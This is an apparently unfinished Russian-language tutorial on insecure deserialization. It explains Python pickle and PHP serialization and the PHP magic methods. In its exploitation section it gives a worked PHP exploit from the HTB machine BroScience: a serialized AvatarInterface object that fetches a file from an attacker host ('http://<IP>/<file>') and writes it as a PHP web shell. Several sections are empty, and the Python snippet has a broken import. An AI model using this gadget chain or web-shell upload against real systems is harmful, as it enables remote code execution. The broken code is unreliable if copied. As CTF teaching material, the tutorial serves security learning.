# Insecure Deserealization

### 1. Что такое и с чем едят?

### Начнём с  сериализации

**Сериализация** - это способ превратить **обьект** в **поток байтов**, похожих на **строку**, сделать из **огромного набора данных** просто **строчку**. Строчка же потом может использоваться или куда-нибудь передаваться **(передача данных клиента, хранение сложных объектов в базе данных, передача данных через API на разных языках программирования)**. И хоть под словом сериализация можно подразумевать **JSON**, это всё же не так. Он не поддерживает передачу классов. Но у некоторых языков существуют методы сериализации в библиотеках или в самом языке, которые как раз могут передавать классы (если это необходимо).

Приведу очень очень простой пример на Python (такие примеры будут на многих языках)
<details>
<summary>Пример сериализации на Python</summary>

Создадим класс нашего объекта:
```
class Student:
	def __init__(self, name, age, grade):
		self.name = name
		self.age = age
		self.grade = grade
```
Теперь создадим объект:
```
student = Student("Nikita",20,"SS")
```
Импортируем нашу библиотеку, сериализуем наши данные и выполним десериализацию:
```
import picle4 as picle

serialize_student = pickle.dumps(student)

deserialize_student = pickle.loads(serialize_student)
print(deserialize_student.name)
print(deserialize_student.age) // and etc
```
Подмечу, что данные будут выглядить как поток рандомных байтов, поэтому если и используют сериализацию, то её кодируют в base64.  Пример кодировки:
```
print(base64.b64encode(serialize_student)
```

У сериализованных объектов начало всегда одинаковое. Вот начало **base64 сериализованного объекта**:
**gASVR**QAAAAAAAACMCF9fbWFpbl9flIwHU3R1ZGVudJSTlCmBlH2UKIwEbmFtZZSMBk5pa2l0YZSMA2FnZZRLFIwFZ3JhZGWUjAJTU5R1Yi4=

Заметьте, что он начинается на **gASVR**. Так будет начинаться **любой сериализованный объект в python'e в base64 формате** :). Для примера ещё могу привести любую другую кодировку, но думаю это будет излишне. Можете сами поэксперементировать.
</details>
<details>
<summary>Пример сериализации на PHP</summary

**PHP** же по умолчанию поддерживает сериализацию. Дабы преобразовать наш объект в поток байтов,нам нужно написать serialize($obj). Поток будет выглядить так:

```
O:4:"User":2:{s:8:"username";s:4:"nope";s:7:"isAdmin";b:0;}
```

* **"O:4"** **O** - означает объект, **4** - длина класса объекта.  **User** - 4 символа
*  **":2"** - количество полей в самом объекте. Их **2** - **username** и **isAdmin**
*  **"s:8"** **s** обозначает **String**, т.е текстовый формат, а **8** - длина переменной **username**. Наше значение переменной **username** тоже строка длиною **4** символа. С другой переменной такая же аналогия, но её  значение имеет не **String** формат, а **bolean**, т.е либо **да** (1) либо **нет** (0)



</details>

### А зачем нужна сериализация?

Хорошо, мы поняли что есть какая-то фигня, которая может объект преобразовать в строчку каких-то байтов. И, собственно, напрашивается. А нахрена это? 
/// <Никита помоги я сам хуй знает зачем это>

/// Примеры на других япах потом дополню

### Десериализация

Наверное вы уже догадались, что **десериализация** - обратный процесс сериализации. Т.е восстановление **объекта** из **потока байтов**. Т.е тут уже мы получаем эту строчку байтов и используем как хотим :) (не мы, а код конечно же)

### Небезопасная десериализация

В общех чертах я рассказал что такое **сериализация**, **десериализация**, зачем оно нужно и показал примеры кода. Теперь нам нужно понять как мы можем это использовать. А также нам нужно выработать свою методологию поиска этой редкой вулны. На самом деле уязвимость нелегко найти при black-box тестировании, поэтому я бы отнёс её к разряду white-box. Я бы даже сказал нереально!

Очевидно, что **небезопасная десериализация** - это **небезопасный способ передачи сериализованных данных**. Т.е тех данных, которые мы можем изменить. Самый базовый пример:

Представьте, что у вас в **cookie-файлах** хранится информация о вашем юзере в **сериализованном формате**. **Cookie-файлы** хранятся у **клиента**, значит мы их можем изменить. А представьте что будет, если мы поменяем своё имя в этих сериализованных данных на admin? Полный захват учётки админа. Вот и весь простой пример.

### 2. Методология поиска

#### BlackBox



#### WhiteBox







### 3. Методы эксплуатации / читщит

<details>

<summary> PHP </summary>

Ранее мы рассмотрели простой пример с плохой логикой в файлах куки. Но это был самый простой и не очень реалистичный пример эксплуатации

Рассмотрим эксплуатацию через **Magic Methods**

**Магические методы в PHP ** - это набор некоторых методов, которые автоматически вызываются при определенных обстоятельствах.  Дока на них [здеся](https://www.php.net/manual/ru/language.oop5.magic.php). Но я более чем уверен, что вам будет влом это читать, поэтому выделю быстро и кратко некоторые из них (читать все необязательно):

 * **__construct()** - эм, ну как бы самый базовый метод при котором мы устанавливаем значения переменных. Каждый использовал, я думаю :) Метод вызывается всегда при создании объекта
 <details><summary>Пример __construct()</summary>

```
class User { 
	public  $id;
	public  $username;
	public  $email;
	private  $password;
	public  function __construct($id, $username, $email, $password) {
				$this->id = $id;
				$this->username = $username;
				$this->email = $email;
				$this->password = $password;
	}
	
$obj = new User(12, "Nope","dan@gmail.com","123456")
```

</details>


 * **__destruct()** - обратный метод констракта. Это метод класса, который вызывается автоматически при уничтожении объекта, например, когда на объект больше нет ссылок или когда выполнение программы завершается. Деструктор часто используется для освобождения ресурсов, таких как закрытие файлов или соединений с базой данных. 
<details><summary>Пример __destruct() и его срабатывание</summary>

```
class Example {
    public function __construct() {
        echo "Объект создан";
    }

    public function __destruct() {
        echo "Объект уничтожен";
    }
}


// Пример 1: Объект уничтожится, когда переменная $obj перестанет ссылаться на него
$obj = new Example();
$obj = null; // Объект уничтожится здесь


// Пример 2: Объект уничтожится при завершении скрипта
$obj = new Example();
// Конец скрипта, объект уничтожится здесь


// Пример 3: Явный вызов unset() для удаления ссылки на объект
$obj = new Example();
unset($obj); // Объект уничтожится здесь


// Пример 4: Явный вызов деструктора через метод __destruct()
$obj = new Example();
$obj->__destruct(); // Объект уничтожится здесь


// Пример 5: Объект уничтожится при выходе из функции
function createObject() {
    $obj = new Example();
}
createObject(); // Объект уничтожится здесь

```

</details>


 * **__sleep()**  - метод позволяет определить, какие свойства объекта должны быть сериализованы. Поэтому когда происходит сериализация класса, она всегда включается. К примеру. У нас есть **password** и **username**. Мы хотим выдать куку, но не вставлять в неё **password** (это было бы глупо, хранить в куки-файлах пароли). Так вот, если в **__sleep()** указать **return array('username')**, то сериализовываться всегда будет только переменная **username**. Удобно? Удобно!
<details><summary>Пример __sleep()</summary>

```
class User {
    public $id;
    public $username;
    public $email;
    private $password;

    public function __construct($id, $username, $email, $password) {
        $this->id = $id;
        $this->username = $username;
        $this->email = $email;
        $this->password = $password;
    }

    public function __sleep() {
        // Возвращаем список свойств, которые должны быть сериализованы
        return array('id', 'username', 'email');
    }
}

$user = new User(1, 'john_doe', 'john@example.com', 'secret');

$serialized = serialize($user);
echo $serialized;

// Вывод: O:4:"User":3:{s:2:"id";i:1;s:8:"username";s:8:"john_doe";s:5:"email";s:16:"john@example.com";}

```
 </details>
 
 
* **__wakeup()** - Если **__sleep()** используется при сериализации, очевидно, что wakeup при десериализации. Когда объект десериализуется с помощью функции `unserialize()`, PHP автоматически вызывает метод `__wakeup()`, если он определен в классе. Этот метод позволяет восстановить какие-либо данные или настройки объекта после десериализации.
<details><summary>Пример __wakeup()</summary>

```
class User {
    public $id;
    public $username;
    public $email;
    private $password;

    public function __construct($id, $username, $email, $password) {
        $this->id = $id;
        $this->username = $username;
        $this->email = $email;
        $this->password = $password;
    }

    public function __sleep() {
        return array('id', 'username', 'email');
    }

    public function __wakeup() {
        // Можно выполнить какие-либо действия после десериализации
        $this->password = '********'; // Обнуляем пароль
    }
}

$serialized = 'O:4:"User":3:{s:2:"id";i:1;s:8:"username";s:8:"john_doe";s:5:"email";s:16:"john@example.com";}';

$user = unserialize($serialized);

echo $user->id . "\n"; // 1
echo $user->username . "\n"; // john_doe
echo $user->email . "\n"; // john@example.com
echo $user->password . "\n"; // ********

```

</details>

* **__toString()**  - метод автоматически вызывается, когда объект требуется представить в виде строки, например, при использовании в функции **echo** или в строковом контексте
<details> <summary>Пример __toString()</summary>

```
<?php   
class TestClass  
{  
	public $foo;  
  
	public function __construct($foo){
		$this->foo = $foo;  
	}  
  
	public function __toString(){
		return $this->foo;  
	}  
}  
  
$class = new TestClass('Hello');  
echo $class; //Выведет Hello вместо ошибки
?>
```

</details>

Отлично, мы разобрали все популярные магические методы, которые используются для эксплуатации нашей уязвимости. Ну а кто не просмотрел - говнюк и всё-равно вернётся сюда для понимания. Так вот, в итоге при WhiteBox'e обращайте внимание на эти главные методы, если ищете десериализацию :) Ниже будут приведены примеры эксплоитов:


<details><summary>Через __wakeup()</summary>

Рассмотрим следующий код с тачки **BroScience** на **HTB**:

```
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp)); 
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

///Тут должен быть эмулятор cmd
У нас есть класс **AvatarInterface** с полями **tmp,imgPath**, а также **magic** методом **__wakeup()**
Вспоминаем когда у нас **wakeup** вызывается (при десериализации  ес чо). 
В **wakeup** есть поле **a**, которое принимает объект **Avatar** и передаёт ему в конструктор значение поля **imgPath**, а потом вызывает функцию **save** из этого объекта. Записали, запомнили. Теперь другой класс.

**Avatar**. Собственно, он принимает в конструктор файл (ну так задумано как минимум) и присваивает его своему полю **imgPath**
Функция **save** принимает в себя переменную, в которой должны быть данные для картинки (ну необязательно). Дальше она открывает файл  **imgPath** (который мы передали в конструктор через **wakeup**) для записи. Следующим шагом она записывает в **imgPath** содержимое **tmp** объекта **AvatarInterface**

(если что  file_get_contents может принимать URL вместо файла, это так особенность PHP. Наверное напишу про это когда LFI буду делать)

Подытожим:
У нас есть 2 объединенных между собой класса. Через один мы можем контролировать переменные другого, а следовательно записать произвольный файл с произвольным кодом. Только вот нам нужно найти код, который будет всю нашу парашу десериализовывать. Код под **exploit** выглядил бы так:

```
<?php
class Avatar{
	public $imgPath;
	
	public function __construct($imgPath){
		$this->imgPath = $imgPath;
	}

	public function save($tmp){
		$f = fopen($this->imgPath, "w");
		fwrite($f, file_get_contents($tmp));
		fclose($f);
	}
}

class AvatarInterface {
	public $tmp;
	public $imgPath;

	public function __wakeup(){
		$a = new Avatar($this->imgPath);
		$a->save($this->tmp);
	}
}

$avatar_interface = new AvatarInterface();
$avatar_interface->tmp = "http://<IP>/<file>"; //Сюда мы должны записать вредоносный код (типо system($_REQUEST['cmd'])
$avatar_interface->imgPath = "./abobich.php"; // Куда сохранится наш файл

$ser = serialize($avatar_interface);

echo $ser;
?>

```

Теперь, если копаться на тачке, то мы должны найти следующий фрагмент кода:

</details>





<!--stackedit_data:
eyJoaXN0b3J5IjpbLTY4Njk2ODI4Nl19
-->